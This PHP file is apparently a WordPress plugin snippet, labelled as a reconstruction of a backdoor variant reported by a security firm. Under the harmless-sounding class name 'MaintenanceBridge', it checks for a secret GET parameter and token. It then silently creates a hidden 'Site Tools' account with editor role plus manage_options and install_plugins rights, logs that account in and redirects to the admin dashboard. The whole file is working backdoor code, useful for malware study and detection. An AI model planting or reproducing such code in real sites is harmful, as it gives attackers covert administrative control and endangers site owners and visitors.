<?php
// Reconstruction of Nethemba's quoted first variant; class-constant bug repaired.
final class MaintenanceBridge {
    const FIELD = '_9f5696';
    const TOKEN = '0123456789abcdef0123456789abcdef';
    const LOGIN = 'data-ops43';
    const PASSWORD = 'fixture-password-only';
    public static function sync() {
        if (isset($_GET[self::FIELD]) && hash_equals(self::TOKEN, (string) $_GET[self::FIELD])) {
            $user = get_user_by('login', self::LOGIN);
            if (!$user) {
                $uid = wp_insert_user(array(
                    'user_login' => self::LOGIN,
                    'user_pass' => self::PASSWORD,
                    'user_email' => self::LOGIN . '@example.org',
                    'display_name' => 'Site Tools',
                    'role' => 'editor',
                ));
                if (is_wp_error($uid)) return;
                $account = new WP_User($uid);
                $account->add_cap('manage_options');
                $account->add_cap('install_plugins');
                $user = get_user_by('id', $uid);
            }
            wp_set_current_user($user->ID, $user->user_login);
            wp_set_auth_cookie($user->ID, true, is_ssl());
            wp_safe_redirect(admin_url('index.php'));
            exit;
        }
    }
}
add_action('init', array('MaintenanceBridge', 'sync'), 1);
